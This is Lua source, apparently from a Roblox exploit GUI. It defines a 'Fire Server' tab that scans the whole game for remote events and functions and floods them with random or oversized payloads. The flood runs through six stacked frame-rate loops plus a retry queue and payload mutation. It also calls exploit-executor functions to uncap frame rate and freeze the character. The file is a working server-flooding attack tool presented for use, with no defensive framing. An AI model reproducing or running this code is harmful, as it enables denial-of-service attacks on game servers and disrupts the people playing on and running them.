local function BuildFireServerTab()
    local tab = CreatedTabs and CreatedTabs["Fire Server"]
    if not tab or not tab.CreateSection then return end
    local fsAccent       = TabAccents["Fire Server"] or Color3.fromRGB(77, 77, 77)
    local RS = RunService
    local spamActive         = false
    local spamToken          = 0
    local totalFires         = 0
    local fireRateSec        = 0
    local spamRate           = 500
    local sharedRateCounter  = 0
    local sharedRateResetAt  = 0
    local targetMode         = "All"
    local customNameFilter   = ""
    local payloadMode        = "nil"
    local discoveredRemotes  = {}
    local stfActive        = false
    local stfToken         = 0
    local stfRemote        = nil
    local stfRate          = 200
    local stfStatusLabel   = nil
    local remoteListScroll = nil
    local mutationActive     = false
    local mutationInterval   = 50
    local mutationCycle      = 0
    local mutationIdx        = 1
    local MUTATION_POOL      = { "nil", "true/false", "random number", "random string", "empty table" }
    local savedPayloadMode   = nil
    local logSampleCounter   = 0
    local retryQueue         = {}
    local statsFiresLabel, statsRateLabel, liveStatusLabel, liveRemotesLabel
    local playBtn, playStroke
    local threadCount       = 4
    local desyncEnabled     = true
    local heavyPayload      = false
    local heavySize         = 500
    local burstMode         = false
    local burstSize         = 20
    local burstPause        = 0.05
    local invokeFlood       = false
    local rotateRemotes     = true
    local antiLagActive     = false
    local fpsUnlockActive   = false
    local charFreezeActive  = false
    local charFreezeConn    = nil
    local activeThreads     = 0
    local _fsConns          = {}
    local function scanRemotes()
        discoveredRemotes = {}
        pcall(function()
            local function recurse(parent, depth)
                if depth > 100 then return end
                local ok2, children = pcall(function() return parent:GetChildren() end)
                if not ok2 then return end
                for _, child in ipairs(children) do
                    if child:IsA("RemoteEvent") then
                        table.insert(discoveredRemotes, { name = child.Name, inst = child, kind = "Event" })
                    elseif child:IsA("RemoteFunction") then
                        table.insert(discoveredRemotes, { name = child.Name, inst = child, kind = "Function" })
                    end
                    recurse(child, depth + 1)
                end
            end
            recurse(game, 1)
        end)
        return #discoveredRemotes
    end
    local function buildPayload()
        if payloadMode == "nil"           then return nil
        elseif payloadMode == "true/false"    then return math.random(0,1) == 1
        elseif payloadMode == "random number" then return math.random(1, 999999)
        elseif payloadMode == "random string" then
            local c = "abcdefghijklmnopqrstuvwxyz0123456789"
            local s = ""
            for _ = 1, math.random(4, 16) do local i = math.random(1,#c) s = s .. c:sub(i,i) end
            return s
        elseif payloadMode == "empty table" then return {}
        end
        return nil
    end
    local function buildHeavyBlob()
        local blob = {}
        for i = 1, heavySize do
            blob[i] = { id = i, v = math.random(0, 0xFFFF), s = tostring(math.random()) }
        end
        return blob
    end
    local function buildFinalPayload()
        local base = buildPayload()
        if heavyPayload then
            if type(base) == "table" then
                base.__heavy = buildHeavyBlob()
                return base
            else
                return { base = base, heavy = buildHeavyBlob() }
            end
        end
        return base
    end
    local function tryUnlockFPS()
        pcall(function()
            if typeof(setfpscap) == "function" then setfpscap(0) return end
            if typeof(syn) == "table" and typeof(syn.set_fps_cap) == "function" then
                syn.set_fps_cap(0) return
            end
            if _G and typeof(_G.setfpscap) == "function" then _G.setfpscap(0) return end
            local fenv = typeof(getfenv) == "function" and getfenv(0) or nil
            if fenv and typeof(fenv.setfpscap) == "function" then fenv.setfpscap(0) end
        end)
    end
    local function tryRestoreFPS()
        pcall(function()
            if typeof(setfpscap) == "function" then setfpscap(60) return end
            if typeof(syn) == "table" and typeof(syn.set_fps_cap) == "function" then
                syn.set_fps_cap(60) return
            end
            if _G and typeof(_G.setfpscap) == "function" then _G.setfpscap(60) return end
        end)
    end
    local function startCharFreeze()
        if charFreezeConn then return end
        local RS2 = RunService
        charFreezeConn = DirectConnect(GetSignal(RS2, "Heartbeat"), function()
            pcall(function()
                local char = LocalPlayer and LocalPlayer.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                local hum  = char:FindFirstChildOfClass("Humanoid")
                if root and hum then
                    root.AssemblyLinearVelocity  = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end)
        end)
    end
    local function stopCharFreeze()
        if charFreezeConn then
            pcall(function() charFreezeConn:Disconnect() end)
            charFreezeConn = nil
        end
    end
    do
        local _fsLP = Players and Players.LocalPlayer
        if _fsLP then
            SafeConnect(GetSignal(_fsLP, "CharacterAdded"), function(newChar)
                stopCharFreeze()
                charFreezeActive = false
                task.spawn(function()
                    task.wait(0.1)
                    pcall(function()
                        local hum = newChar:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health <= 0 then
                            hum.Health = hum.MaxHealth
                        end
                    end)
                end)
            end)
        end
    end
    local function getTargetRemotes()
        local list = {}
        for _, r in ipairs(discoveredRemotes) do
            local ok = false
            if targetMode == "All" then
                ok = true
            elseif targetMode == "Events Only" then
                ok = r.kind == "Event"
            elseif targetMode == "Functions Only" then
                ok = r.kind == "Function"
            elseif targetMode == "Custom" then
                ok = customNameFilter ~= "" and
                     string.find(r.name:lower(), customNameFilter:lower(), 1, true) ~= nil
            end
            if ok then table.insert(list, r) end
        end
        return list
    end
    local function startSpam(preResolvedTargets)
        if spamActive then return end
        spamActive        = true
        spamToken         = spamToken + 1
        totalFires        = 0
        activeThreads     = 0
        sharedRateCounter = 0
        fireRateSec       = 0
        mutationCycle     = 0
        mutationIdx       = 1
        logSampleCounter  = 0
        _fsConns          = {}
        if statsRateLabel  then statsRateLabel.Text  = "Fires / sec: " .. _CHR.EM_DASH end
        if statsFiresLabel then statsFiresLabel.Text = "Total Fires: 0" end
        local myToken = spamToken
        if antiLagActive then
            if fpsUnlockActive  then tryUnlockFPS() end
            if charFreezeActive then startCharFreeze() end
        end
        task.spawn(function()
            local targets = (preResolvedTargets and #preResolvedTargets > 0)
                            and preResolvedTargets
                            or  getTargetRemotes()
            if #targets == 0 then
                spamActive = false
                pcall(function()
                    if liveStatusLabel then
                        liveStatusLabel.Text       = _CHR.BULLET .. " NO TARGETS"
                        liveStatusLabel.TextColor3 = Color3.fromRGB(143, 143, 143)
                    end
                    if liveRemotesLabel then liveRemotesLabel.Text = "Targets: " .. _CHR.EM_DASH end
                end)
                return
            end
            local targetCount  = #targets
            local capThreads   = math.max(1, threadCount)
            -- firesPerBatch: capThreads used as multiplier (not thread count) -- no coroutine overhead
            local firesPerBatch = math.max(1, math.ceil(spamRate / 60) * capThreads)
            retryQueue          = {}
            activeThreads       = capThreads
            local _fireIdx      = 0
            -- batch-fire helper: builds payload once, cycles all targets, no per-thread blocking
            local function fireBatch(count)
                local payload = buildFinalPayload()
                for _ = 1, count do
                    if not spamActive or spamToken ~= myToken then break end
                    _fireIdx = _fireIdx + 1
                    local remote = targets[((_fireIdx - 1) % targetCount) + 1]
                    if remote and remote.inst and remote.inst.Parent then
                        if not (invokeFlood and remote.kind ~= "Function") then
                            local ok = pcall(function()
                                if remote.kind == "Function" then
                                    remote.inst:InvokeServer(payload)
                                else
                                    remote.inst:FireServer(payload)
                                end
                            end)
                            if ok then
                                totalFires        = totalFires        + 1
                                sharedRateCounter = sharedRateCounter + 1
                            else
                                retryQueue[#retryQueue + 1] = { inst = remote.inst, kind = remote.kind, payload = payload }
                            end
                        end
                    end
                end
            end
            -- LAYER 1: Heartbeat -- ONE spawn per frame fires firesPerBatch; replaces staggered coroutines
            -- callback returns immediately: zero coroutine-resume overhead on the scheduler
            local c1 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch) end)
            end)
            _fsConns[#_fsConns + 1] = c1
            -- LAYER 2: Second Heartbeat -- 2x batch, additive flood on same cadence
            local c2 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch * 2) end)
            end)
            _fsConns[#_fsConns + 1] = c2
            -- LAYER 3: Stepped -- physics cadence, full firesPerBatch
            local c3 = RunService.Stepped:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch) end)
            end)
            _fsConns[#_fsConns + 1] = c3
            -- LAYER 4: RenderStepped -- full batch (was half before)
            local c4 = RunService.RenderStepped:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch) end)
            end)
            _fsConns[#_fsConns + 1] = c4
            -- LAYER 5: Storm -- fires EVERY Heartbeat (gate removed; was every 2), 4x batch
            local c5 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch * 4) end)
            end)
            _fsConns[#_fsConns + 1] = c5
            -- LAYER 6: Extra Stepped -- second physics salvo, 2x batch
            local c6 = RunService.Stepped:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                task.spawn(function() fireBatch(firesPerBatch * 2) end)
            end)
            _fsConns[#_fsConns + 1] = c6
            -- Retry flush: Heartbeat drains retryQueue via spawned task
            local cRetry = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if #retryQueue > 0 then
                    local batch = retryQueue
                    retryQueue  = {}
                    task.spawn(function()
                        for _, item in ipairs(batch) do
                            if item.inst and item.inst.Parent then
                                pcall(function()
                                    if item.kind == "Function" then
                                        item.inst:InvokeServer(item.payload)
                                    else
                                        item.inst:FireServer(item.payload)
                                    end
                                    totalFires        = totalFires        + 1
                                    sharedRateCounter = sharedRateCounter + 1
                                end)
                            end
                        end
                    end)
                end
            end)
            _fsConns[#_fsConns + 1] = cRetry
            -- Stats display: low-freq Heartbeat, UI via task.defer so it never competes with fire calls
            local frameAcc = 0
            local cDisp = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                frameAcc = frameAcc + 1
                if frameAcc < 120 then return end
                frameAcc = 0
                local snapshotRate = sharedRateCounter
                fireRateSec        = snapshotRate
                sharedRateCounter  = 0
                task.defer(function()
                    pcall(function()
                        if statsFiresLabel then
                            statsFiresLabel.Text = "Total Fires: " .. tostring(totalFires)
                        end
                        if statsRateLabel then
                            local rStr
                            if snapshotRate >= 1000000 then
                                rStr = string.format("%.2fM", snapshotRate / 1000000)
                            elseif snapshotRate >= 1000 then
                                rStr = string.format("%.1fK", snapshotRate / 1000)
                            else
                                rStr = tostring(snapshotRate)
                            end
                            statsRateLabel.Text = "Fires / sec: ~" .. rStr
                        end
                    end)
                end)
            end)
            _fsConns[#_fsConns + 1] = cDisp
        end)
    end
